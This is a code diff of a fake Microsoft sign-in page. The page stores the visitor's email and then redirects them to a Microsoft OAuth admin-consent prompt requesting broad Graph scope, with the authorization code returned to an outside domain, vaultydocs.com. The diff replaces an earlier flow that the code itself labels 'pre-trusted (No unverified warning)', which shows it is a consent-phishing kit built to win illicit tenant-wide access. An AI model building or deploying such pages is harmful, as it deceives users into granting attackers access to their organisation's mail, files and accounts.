@@ -89,11 +89,6 @@
       background-color: #ccc;
       color: #1b1b1b;
       border: 1px solid #ccc;
-      padding: 10px 32px;
-      cursor: pointer;
-    }
-    .btn.btn-secondary-gray:hover {
-      background-color: #b3b3b3;
     }
     .form-box .btn {
       font-size: 15px;
@@ -111,32 +106,21 @@
       padding: 16px 44px;
       margin-top: 16px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-    .options-box:hover {
-      background-color: #f5f5f5;
     }
     .options-box p {
         margin: 0;
         font-size: 15px;
-        display: flex;
-        align-items: center;
     }
     .options-box a {
       color: #1b1b1b;
       text-decoration: none;
-      display: flex;
-      align-items: center;
-      width: 100%;
     }
     .options-box a:hover {
-      text-decoration: none;
+      text-decoration: underline;
     }
-    .fa-search {
+    .fa-key {
       color: #5e5e5e;
-      margin-right: 16px;
-      font-size: 18px;
+      margin-right: 8px;
     }
     .page-footer {
         position: fixed;
@@ -193,63 +177,6 @@
     .troubleshooting-body p { margin: 8px 0; }
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
-    /* ✅ Sign-in Options View Styles */
-    .signin-option-item {
-        display: flex;
-        align-items: flex-start;
-        padding: 16px 0;
-        cursor: pointer;
-        border-bottom: 1px solid #e0e0e0;
-    }
-    .signin-option-item:last-child {
-        border-bottom: none;
-    }
-    .signin-option-item:hover {
-        background-color: #f5f5f5;
-    }
-    .signin-option-icon {
-        width: 50px;
-        height: 50px;
-        border-radius: 50%;
-        background-color: #f2f2f2;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-size: 28px;
-        color: #333;
-        margin-right: 16px;
-        flex-shrink: 0;
-    }
-    .signin-option-text h3 {
-        margin: 0 0 4px 0;
-        font-size: 16px;
-        font-weight: 600;
-        color: #1b1b1b;
-    }
-    .signin-option-text p {
-        margin: 0;
-        font-size: 13px;
-        color: #5e5e5e;
-    }
-    .signin-option-help {
-        width: 24px;
-        height: 24px;
-        border-radius: 50%;
-        border: 2px solid #ccc;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-size: 14px;
-        color: #ccc;
-        cursor: pointer;
-        flex-shrink: 0;
-        margin-left: auto;
-    }
-    .back-button-container {
-        margin-top: 24px;
-        display: flex;
-        justify-content: center;
-    }
     .hidden { display: none !important; }
     .loading {
       text-align: center;
@@ -264,10 +191,6 @@
       animation: spin 1s linear infinite;
       margin: 0 auto;
     }
-    .mt-4 { margin-top: 1rem; }
-    .mt-3 { margin-top: 0.75rem; }
-    .mt-2 { margin-top: 0.5rem; }
-    .form-group { margin-bottom: 1rem; }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -293,64 +216,22 @@
           </div>
         </div>
 
-        <!-- Office OAuth Loading View -->
+        <!-- Admin Consent Loading View -->
         <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Signing you in...</h1>
           <div class="loading mt-4">
             <div class="spinner"></div>
             <p style="margin-top: 20px; color: #666;">
-              Redirecting to Office for authentication...
+              Redirecting to Microsoft for admin consent...
             </p>
-          </div>
-        </div>
-
-        <!-- ✅ Sign-in Options View (div3) -->
-        <div id="div3" class="hidden">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <h1 class="mt-4">Sign-in options</h1>
-          
-          <!-- Option 1: Face/Fingerprint -->
-          <div class="signin-option-item">
-            <div class="signin-option-icon">👤</div>
-            <div class="signin-option-text">
-              <h3>Face, fingerprint, PIN or security key</h3>
-              <p>Use your device to sign in with a passkey.</p>
-            </div>
-            <div class="signin-option-help">?</div>
-          </div>
-
-          <!-- Option 2: GitHub -->
-          <div class="signin-option-item">
-            <div class="signin-option-icon">
-              <i class="fab fa-github" style="font-size: 28px; color: #333;"></i>
-            </div>
-            <div class="signin-option-text">
-              <h3>Sign in with GitHub</h3>
-            </div>
-          </div>
-
-          <!-- Option 3: Organization -->
-          <div class="signin-option-item">
-            <div class="signin-option-icon">🏢</div>
-            <div class="signin-option-text">
-              <h3>Sign in to an organization</h3>
-              <p>Search for a company or an organization you're working with.</p>
-            </div>
-          </div>
-
-          <div class="back-button-container">
-            <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
           </div>
         </div>
       </div>
 
       <!-- "Sign-in options" Clickable Box -->
       <div class="options-box" id="options_box">
-        <a href="#" id="sign_in_options_link">
-          <i class="fas fa-search"></i>
-          <span>Sign-in options</span>
-        </a>
+        <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
       </div>
     </div>
   </div>
@@ -362,36 +243,24 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - Office.com Pre-trusted OAuth Flow');
+    console.log('🚀 replacement.html loaded - Admin Consent Flow');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
-        const div3 = document.getElementById('div3');
         const optionsBox = document.getElementById('options_box');
         const emailInput = document.getElementById('email');
         const nextBtn = document.getElementById('next');
-        const signInOptionsLink = document.getElementById('sign_in_options_link');
-        const backBtn = document.getElementById('options-view-back');
 
-        // Office.com Pre-trusted OAuth Configuration
-        const OFFICE_CONFIG = {
+        // Microsoft OAuth Configuration
+        const MICROSOFT_CONFIG = {
           clientId: '4765445b-32c6-49b0-83e6-1d93765276ca',
           redirectUri: 'https://vaultydocs.com/auth/callback',
-          scope: 'openid profile https://www.office.com/v2/OfficeHome.All',
+          scope: 'https://graph.microsoft.com/.default',
           authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
         };
 
-        // Generate nonce and state
-        function generateNonce() {
-          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-
-        function generateState() {
-          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-
-        // Email to Office OAuth redirect
+        // Email to admin consent redirect
         nextBtn.addEventListener('click', function () {
             const email = emailInput.value.trim();
             if (!email) {
@@ -405,76 +274,36 @@
             localStorage.setItem('ms_email', email);
             sessionStorage.setItem('ms_email', email);
 
-            // Generate nonce and state
-            const nonce = generateNonce();
-            const state = generateState();
-            
-            sessionStorage.setItem('ms_oauth_nonce', nonce);
-            sessionStorage.setItem('ms_oauth_state', state);
-
             // Show loading state
             div1.classList.add('hidden');
             div2.classList.remove('hidden');
-            div3.classList.add('hidden');
             optionsBox.classList.add('hidden');
 
-            console.log('🔄 Preparing Office.com pre-trusted OAuth flow...');
-            console.log('📊 Config:', OFFICE_CONFIG);
+            console.log('🔄 Preparing admin consent flow...');
+            console.log('📊 Config:', MICROSOFT_CONFIG);
 
-            // Build Office.com OAuth URL (pre-trusted endpoint)
-            const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
-            officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
-            officeOAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
-            officeOAuthUrl.searchParams.append('response_type', 'code id_token');
-            officeOAuthUrl.searchParams.append('scope', OFFICE_CONFIG.scope);
-            officeOAuthUrl.searchParams.append('response_mode', 'form_post');
-            officeOAuthUrl.searchParams.append('nonce', nonce);
-            officeOAuthUrl.searchParams.append('state', state);
-            officeOAuthUrl.searchParams.append('ui_locales', 'en-US');
-            officeOAuthUrl.searchParams.append('mkt', 'en-US');
-            officeOAuthUrl.searchParams.append('prompt', 'login');
+            // Build admin consent URL
+            const adminConsentUrl = new URL(MICROSOFT_CONFIG.authority);
+            adminConsentUrl.searchParams.append('client_id', MICROSOFT_CONFIG.clientId);
+            adminConsentUrl.searchParams.append('redirect_uri', MICROSOFT_CONFIG.redirectUri);
+            adminConsentUrl.searchParams.append('response_type', 'code');
+            adminConsentUrl.searchParams.append('scope', MICROSOFT_CONFIG.scope);
+            adminConsentUrl.searchParams.append('prompt', 'admin_consent'); // ✅ KEY: Admin consent mode
+            adminConsentUrl.searchParams.append('state', btoa(JSON.stringify({ email, timestamp: Date.now() })));
 
-            console.log('🌐 Redirecting to Office.com pre-trusted OAuth...');
-            console.log('🔗 URL:', officeOAuthUrl.toString());
-            console.log('✅ Flow Type:', 'Office.com Pre-trusted (No unverified warning)');
-            console.log('📝 Nonce:', nonce);
-            console.log('📝 State:', state);
+            console.log('🌐 Redirecting to Microsoft admin consent...');
+            console.log('🔗 URL:', adminConsentUrl.toString());
 
-            // Redirect to Office OAuth
+            // Redirect to Microsoft
             setTimeout(() => {
-              console.log('🔄 Executing redirect to Office.com...');
-              window.location.href = officeOAuthUrl.toString();
+              window.location.href = adminConsentUrl.toString();
             }, 1500);
         });
 
-        // ✅ Sign-in options card click - Show sign-in options view
-        optionsBox.addEventListener('click', function (e) {
+        // Optional: Sign-in options link
+        document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('🔍 Sign-in options clicked - Showing options');
-            div1.classList.add('hidden');
-            div2.classList.add('hidden');
-            div3.classList.remove('hidden');
-            optionsBox.classList.add('hidden');
-        });
-
-        // ✅ Sign-in options link click - Show sign-in options view
-        signInOptionsLink.addEventListener('click', function (e) {
-            e.preventDefault();
-            console.log('🔍 Sign-in options link clicked - Showing options');
-            div1.classList.add('hidden');
-            div2.classList.add('hidden');
-            div3.classList.remove('hidden');
-            optionsBox.classList.add('hidden');
-        });
-
-        // ✅ Back button - Return to main sign-in view
-        backBtn.addEventListener('click', function (e) {
-            e.preventDefault();
-            console.log('🔙 Back clicked - Returning to sign-in');
-            div1.classList.remove('hidden');
-            div2.classList.add('hidden');
-            div3.classList.add('hidden');
-            optionsBox.classList.remove('hidden');
+            alert('Additional sign-in options coming soon');
         });
     });
   </script>
